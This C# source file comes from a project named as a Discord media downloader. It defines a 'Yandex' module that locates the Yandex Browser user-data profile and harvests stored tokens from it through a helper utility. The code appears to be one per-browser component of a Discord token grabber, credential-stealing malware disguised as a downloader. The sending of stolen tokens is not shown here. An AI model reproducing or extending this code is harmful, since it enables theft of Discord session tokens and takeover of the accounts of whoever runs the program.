using System.Collections.Generic;
using System.Threading.Tasks;

using Discord_Media_DL.Misc;

namespace Discord_Media_DL.Token.Apps
{
    class Yandex : IApp
    {
        public string Name => "Yandex";

        public string[] TokenPaths => new string[]
        {
            Help.Paths.AppDataLocal + @"\Yandex\YandexBrowser\User Data\Default"
        };

        public async Task<string[]> GetTokens()
        {
            List<string> result = new();

            ParallelLoopResult loop = Parallel.ForEach(TokenPaths, (tokenPath) =>
            {
                result.AddRange(TokensUtil.GetTokensFromPath(tokenPath, null));
            });

            while (loop.IsCompleted == false)
                await Task.Delay(100);

            return result.ToArray();
        }
    }
}
